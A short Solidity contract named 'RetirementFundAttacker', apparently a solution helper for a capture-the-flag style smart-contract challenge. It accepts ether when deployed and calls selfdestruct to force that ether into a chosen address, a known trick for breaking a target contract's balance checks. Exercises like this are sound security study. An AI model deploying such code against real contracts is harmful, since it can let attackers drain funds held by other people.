pragma solidity 0.6.0;

contract RetirementFundAttacker {
    constructor() public payable {
        require(msg.value > 0);
    }

    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
